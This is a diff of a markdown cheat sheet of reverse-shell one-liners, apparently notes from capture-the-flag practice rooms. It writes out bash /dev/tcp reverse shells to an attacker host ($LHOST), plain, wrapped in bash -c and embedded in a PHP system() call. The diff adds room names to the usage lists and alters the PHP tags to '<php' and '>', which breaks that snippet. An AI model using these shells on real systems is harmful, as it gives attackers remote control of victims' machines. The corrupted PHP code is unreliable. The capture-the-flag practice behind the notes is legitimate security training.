@@ -8,7 +8,7 @@ The most common reverse shell across Linux targets. Works on any system with Bas
 bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1
 ```
 
-Used on: **hijack**, **LazyAdmin**, **Billing**, **bsidesgtdav**, **Skynet**, **Internal**
+Used on: **hijack**, **LazyAdmin**, **Billing**, **bsidesgtdav**, **Skynet**, **Internal**, **DevHub**
 
 ## Wrapped Variants
 
@@ -18,7 +18,7 @@ Used on: **hijack**, **LazyAdmin**, **Billing**, **bsidesgtdav**, **Skynet**, **
 bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'
 ```
 
-Used on: **hijack**
+Used on: **hijack**, **davesblog**, **DevHub**
 
 ### Dropped as a file and triggered separately
 
@@ -37,9 +37,9 @@ Used on: **hijack**
 ### Inside a PHP system() call
 
 ```php
-<?php
+<php
 system('bash -c "bash -i >& /dev/tcp/$LHOST/4444 0>&1"');
-?>
+>
 ```
 
 Used on: **vulnversity**, **rrootme**
